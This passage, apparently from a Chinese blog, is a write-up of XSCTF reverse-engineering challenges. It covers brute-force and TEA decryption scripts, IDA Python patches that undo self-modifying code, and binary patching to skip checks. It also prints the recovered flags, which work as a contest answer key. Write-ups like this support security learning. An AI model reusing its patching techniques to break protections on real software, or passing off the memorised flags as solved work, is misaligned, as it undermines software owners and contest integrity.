src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016150615926.png" alt="image-20231016150615926" style="zoom:50%;" /><p>多切换几个globala和globalb,发现在这两个值相同的情况下,随机的c对结果没有任何影响,所以我们大胆猜测这个加密不需要随机数(其实显然加密不能完全随机(?))</p><p>这样,尽管我们分析不出来这两个函数,但是通过&quot;爆破&quot;我们可以推测出其功能,我们无需化简,只需要把那一堆函数放在一起即可.</p><p>接下来,我们就根据加密的过程进行flag的爆破(代码分析略):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">function _Y0u(_0x5093c8, _0x291ad5) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x5093c8 + _0x291ad5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _C4n(_0x4277b8) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x4277b8 &amp; <span class="number">0xff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _N3v3r(_0x414184, _0x29df09) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_0x414184 ^ _0x29df09)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _G37(_0x500f65, _0x1ddb85) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_0x500f65 | _0x1ddb85)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _Th15(_0x1621d6, _0x285fc7) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_0x1621d6 &amp; _0x285fc7)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4(_0x2abb65) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(~_0x2abb65)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4H4(_0x5b22bc) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n(_H4H4H4(_H4(_0x5b22bc), _H4H4H4([], <span class="number">0x1</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4H4H4(_0x431cb1, _0x516603) &#123;</span><br><span class="line">    <span class="keyword">return</span> _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1, _0x516603)), _H4(_Y0u(_0x431cb1, _0x516603)))), _H4(_G37(_H4(_Y0u(_0x431cb1, _0x516603)), _H4(_Y0u(_0x431cb1, _0x516603))))))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _H4H4H4H4(_0x1b81b8, _0x11e8ab, _0x2c730f) &#123;</span><br><span class="line">    <span class="keyword">return</span> a = _H4H4H4(_0x1b81b8, _0x2c730f), a = _H4H4H4(a, _H4H4(_0x11e8ab)), a = _H4H4H4(a, _H4H4(_0x2c730f)), _C4n(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x55</span>, <span class="number">0xbf</span>, <span class="number">0x63</span>, <span class="number">0xbc</span>, <span class="number">0x33</span>, <span class="number">0x95</span>, <span class="number">0x31</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0x6b</span>, <span class="number">0x49</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0xdf</span>, <span class="number">0x63</span>, <span class="number">0xe5</span>, <span class="number">0x57</span>, <span class="number">0xd7</span>, <span class="number">0x73</span>, <span class="number">0xa6</span>, <span class="number">0x6e</span>, <span class="number">0xd3</span>, <span class="number">0x63</span>, <span class="number">0xa1</span>, <span class="number">0x92</span>, <span class="number">0x5b</span>, <span class="number">0x72</span>, <span class="number">0xe6</span>, <span class="number">0x8f</span>, <span class="number">0x76</span>, <span class="number">0x4f</span>, <span class="number">0xd0</span>]</span><br><span class="line">key = <span class="string">&#x27;Hur1k&#x27;</span></span><br><span class="line"></span><br><span class="line">rand_n = <span class="number">1</span></span><br><span class="line">temp1 = <span class="number">0</span></span><br><span class="line">temp2 = <span class="number">0</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (var c = <span class="number">0</span>; c &lt; <span class="number">128</span>; c += <span class="number">1</span>) &#123;</span><br><span class="line">        temp1 = (c + i) ^ i</span><br><span class="line">        <span class="keyword">if</span>(enc[i] == temp1)&#123;</span><br><span class="line">            flag[<span class="string">&#x27;push&#x27;</span>](c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (var c = <span class="number">0</span>; c &lt; <span class="number">128</span>; c += <span class="number">1</span>) &#123;</span><br><span class="line">        temp2 = _H4H4H4H4(temp1 ^ c, key[<span class="string">&#x27;charCodeAt&#x27;</span>]([i / <span class="number">0x2</span> % key[<span class="string">&#x27;length&#x27;</span>]]),rand_n)</span><br><span class="line">        <span class="keyword">if</span>(enc[i+<span class="number">1</span>] == temp2)&#123;</span><br><span class="line">            flag[<span class="string">&#x27;push&#x27;</span>](c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var flagString = String.fromCharCode(...flag);</span><br><span class="line">console.<span class="built_in">log</span>(flagString);</span><br></pre></td></tr></table></figure><p>得到<code>UR_R341Ly_900d_47_Obfu_ur_Newn3W</code></p><p>所以flag为:<code>XSCTF&#123;UR_R341Ly_900d_47_Obfu_ur_Newn3W&#125;</code></p><h2 id="题目2-福莱阁佳茶">题目2-福莱阁佳茶</h2><p>打开一看114514秒的等待,反手一个patch掉:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151222003.png" alt="image-20231016151222003" style="zoom:50%;" /><p>这样只需要等2秒~~~</p><p>查找字符串发现了可疑字符串,进行交叉引用查找,找到了相关函数,尝试编写解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/*char str[] = &quot;]VFQC~Cpkk|Zm4a6Z1kaZv66n:x&quot;;</span></span><br><span class="line"><span class="comment">    // puts(str);</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; sizeof(str) / sizeof(str[0]); ++i) &#123;</span></span><br><span class="line"><span class="comment">        putchar(str[i] ^ 5);</span></span><br><span class="line"><span class="comment">        //结果:XSCTF&#123;Funny_h1d3_4nd_s33k?&#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;@bm#zlv#ejmg#wkf#eobd&lt;&quot;</span>;</span><br><span class="line">    <span class="comment">// puts(str);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(str) / <span class="keyword">sizeof</span>(str[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(str[i] ^ <span class="number">3</span>);</span><br><span class="line">        <span class="comment">//结果:Can you find the flag?</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是第一个flag并不是真正的flag,还需要继续找.</p><p>发现这个函数里还有问题:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151740260.png" alt="image-20231016151740260" style="zoom:50%;" /><p>太乱了,直接动调,在图中位置下断点,看看运行到这里会发生啥,直接调试:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151828305.png" alt="image-20231016151828305" style="zoom:50%;" /><p>停在了这里,双击看看Str现在发生了什么变化(说实话我也懒得分析这函数啥时候调用…Orz):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151914687.png" alt="image-20231016151914687" style="zoom:50%;" /><p>发现和之前跑出来的flag不一样,尝试提交发现确实如此,这才是正确的flag.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151955195.png" alt="image-20231016151955195" style="zoom:50%;" /><p>这里也能看出代码对flag的后5个字符(不包括<code>'&#125;'</code>)进行了进一步处理…</p><p><code>XSCTF&#123;Funny_h1d3_4nd_HId3!&#125;</code></p><h2 id="题目3-lotery-shop">题目3-lotery_shop</h2><p>这个题,真就是把flag藏进去了是吧,除了flag的加密和提示字符串有关,其他的和彩票系统一点关系都没有.</p><p>分析main函数中的一堆,一个菜单,还有一些随机数生成和检查的相关代码,我倒是了个清楚:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016152435565.png" alt="image-20231016152435565" style="zoom:50%;" /><p>实际上,再仔细对每一个函数分析,就能发现猫腻实际上在程序初始化处理的那个函数中,这个函数原本的职责是用来输出初始的提示信息,并初始化随机数等:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016152541507.png" alt="image-20231016152541507" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016152554693.png" alt="image-20231016152554693" style="zoom:50%;" /><p>我们可以看到,第31行起,进行了彩票系统相关的处理,例如随机数生成的,但是13行到30行就有猫腻,莫名其妙有一些字符操作.</p><p>再看第13行发现其实是调用了malloc函数分配了一段内存.</p><p>但是这代码好像没找到有free()函数的调用哈哈哈,可能有问题(也可能我没找到)</p><p>那么盲猜这就是flag,动调没出来,不知道是缓冲有问题还是咋的,我直接手动写代码(复制粘贴):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a1[]=<span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a2[]=<span class="string">&quot;You&#x27;re our first customer!&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a3[]=<span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span>;</span><br><span class="line">    <span class="type">char</span> a4[]=<span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a5[]=<span class="string">&quot;1.buy a lottery ticket&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a6[]=<span class="string">&quot;2.Check to see if you won&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a7[]=<span class="string">&quot;3.join us&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a8[]=<span class="string">&quot;4.Take a sneak peek at the flag&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a9[]=<span class="string">&quot;5.exit&quot;</span>;</span><br><span class="line">    <span class="type">int</span> a10,a11,a12;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> malloced_str[<span class="number">1000</span>];</span><br><span class="line">    malloced_str[<span class="number">9</span>] = *a5;</span><br><span class="line">    malloced_str[<span class="number">2</span>] = malloced_str[<span class="number">9</span>];</span><br><span class="line">    malloced_str[<span class="number">1</span>] = *(<span class="type">char</span> *)(a1 + <span class="number">10</span>) - <span class="number">12</span>;</span><br><span class="line">    malloced_str[<span class="number">10</span>] = *(<span class="type">char</span> *)(a3 + <span class="number">5</span>) - <span class="number">56</span>;</span><br><span class="line">    malloced_str[<span class="number">7</span>] = *(<span class="type">char</span> *)(a6 + <span class="number">15</span>) - <span class="number">10</span>;</span><br><span class="line">    malloced_str[<span class="number">13</span>] = <span class="built_in">toupper</span>((<span class="type">char</span>)(*(<span class="type">char</span> *)(a8 + <span class="number">3</span>) + <span class="number">3</span>));</span><br><span class="line">    malloced_str[<span class="number">3</span>] = *(<span class="type">char</span> *)(a2 + <span class="number">1</span>) + <span class="number">4</span>;</span><br><span class="line">    malloced_str[<span class="number">11</span>] = <span class="built_in">toupper</span>((<span class="type">char</span>)(*(<span class="type">char</span> *)(a7 + <span class="number">7</span>) - <span class="number">14</span>));</span><br><span class="line">    malloced_str[<span class="number">4</span>] = malloced_str[<span class="number">7</span>];</span><br><span class="line">    *malloced_str = <span class="built_in">tolower</span>((<span class="type">char</span>)(*a9 + <span class="number">31</span>));</span><br><span class="line">    malloced_str[<span class="number">8</span>] = <span class="built_in">toupper</span>(*(<span class="type">char</span> *)(a8 + <span class="number">27</span>));</span><br><span class="line">    malloced_str[<span class="number">5</span>] = <span class="built_in">toupper</span>((<span class="type">char</span>)(*(<span class="type">char</span> *)(a4 + <span class="number">13</span>) - <span class="number">16</span>));</span><br><span class="line">    malloced_str[<span class="number">6</span>] = malloced_str[<span class="number">3</span>];</span><br><span class="line">    malloced_str[<span class="number">12</span>] = a5[<span class="number">6</span>] - <span class="number">39</span>;</span><br><span class="line">    <span class="built_in">puts</span>(malloced_str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153249608.png" alt="image-20231016153249608" style="zoom:50%;" /><p>得到flag:</p><p><code>XSCTF&#123;th1s_Is_F14G:D&#125;</code></p><h2 id="题目4-pytea">题目4-pytea</h2><p>用DIE查看,发现是用pyinstaller打包的程序:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153531900.png" alt="image-20231016153531900" style="zoom: 50%;" /><p>使用pyinstxtractor进行解包,然后丢到pyc在线反编译网站:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153643512.png" alt="image-20231016153643512" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153736267.png" alt="image-20231016153736267" style="zoom:50%;" /><p>提取下来,分析,就是一个纯TEA加密,我们套脚本,不过我对于TEA不太熟,先搞一波试试水,一个个的打印看看,因为解密出来貌似有一些非可见字符.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;  <span class="comment">// 注意sum也是32位无符号整型</span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="type">uint32_t</span> v[] = &#123;</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0x93178965</span>L, <span class="number">1446958341</span>, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">0xD103A1FC</span>L, <span class="number">0xEA41C188</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">2119578006</span>, <span class="number">1735799975</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">998166288</span>,</span><br><span class="line">            <span class="number">1533730069</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF0B370A5</span>L, <span class="number">0x8F4854A9</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0x93178965</span>L, <span class="number">1446958341</span>, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">0xE7792E99</span>L, <span class="number">1516481470</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xF0B370A5</span>L, <span class="number">0x8F4854A9</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xB47C2782</span>L,</span><br><span class="line">            <span class="number">0x85FFC9D3</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">1256740478</span>, <span class="number">0xE4E1C8F7</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xD103A1FC</span>L, <span class="number">0xEA41C188</span>L, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">1565438833</span>, <span class="number">0xA0F1C10B</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xC2F51E4D</span>L, <span class="number">1371444109</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF0B370A5</span>L,</span><br><span class="line">            <span class="number">0x8F4854A9</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xFE42A23C</span>L, <span class="number">0x8D5DBC7C</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0x9EC5E417</span>L, <span class="number">401575738</span>, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">998166288</span>, <span class="number">1533730069</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xD103A1FC</span>L, <span class="number">0xEA41C188</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">1259602668</span>,</span><br><span class="line">            <span class="number">877012692</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">1565438833</span>, <span class="number">0xA0F1C10B</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF0B370A5</span>L, <span class="number">0x8F4854A9</span>L, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">0x93178965</span>L, <span class="number">1446958341</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xB2C8C968</span>L, <span class="number">285984659</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF59A7B5D</span>L,</span><br><span class="line">            <span class="number">0xC520BE45</span>L</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">83</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">104</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">96</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        decrypt(&amp;v[i], k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>, v[i], v[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里贴的最终的脚本,实际没影响,直接全输出就行,将空白删掉就是flag:</p><p><code>T1m3_T0_DR1NK_CE31ON_Tea</code></p><p>即</p><p><code>XSCTF&#123;T1m3_T0_DR1NK_CE31ON_Tea&#125;</code></p><h2 id="题目5-奇怪的光之翼">题目5-奇怪的光之翼</h2><p>这个题是除了JSNEWNEW外我做的最折磨的一道题…魔改TEA是吧…</p><p>密码爷们看了都说好!</p><p>分析发现,前面有个假加密,而且不patch的话,程序势必走向这个错误的分支,所以真正的flag在else分支中:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016155905931.png" alt="image-20231016155905931" style="zoom:50%;" /><p>继续分析正确的分支:</p><p>题目中有两个SMC(代码自修改技术),不解释,直接用IDA Python进行patch掉,注意patch后,如果需要动调,还需要把原来运行SMC的代码patch掉.</p><p>这里已经patch好了,只放IDA Python的脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一个SMC</span></span><br><span class="line">adr = <span class="number">0x0404080</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    temp = get_bytes(adr+i,<span class="number">1</span>)</span><br><span class="line">    temp = <span class="built_in">int</span>.from_bytes(temp,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    temp = temp ^ <span class="number">0x55</span></span><br><span class="line">    patch_byte(adr+i,temp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二个SMC</span></span><br><span class="line">adr = <span class="number">0x0404120</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">254</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    temp = get_bytes(adr+i,<span class="number">1</span>)</span><br><span class="line">    temp2 = get_bytes(adr+i-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">int</span>.from_bytes(temp,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    temp2 = <span class="built_in">int</span>.from_bytes(temp2,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    temp = temp ^ temp2</span><br><span class="line">    patch_byte(adr+i-<span 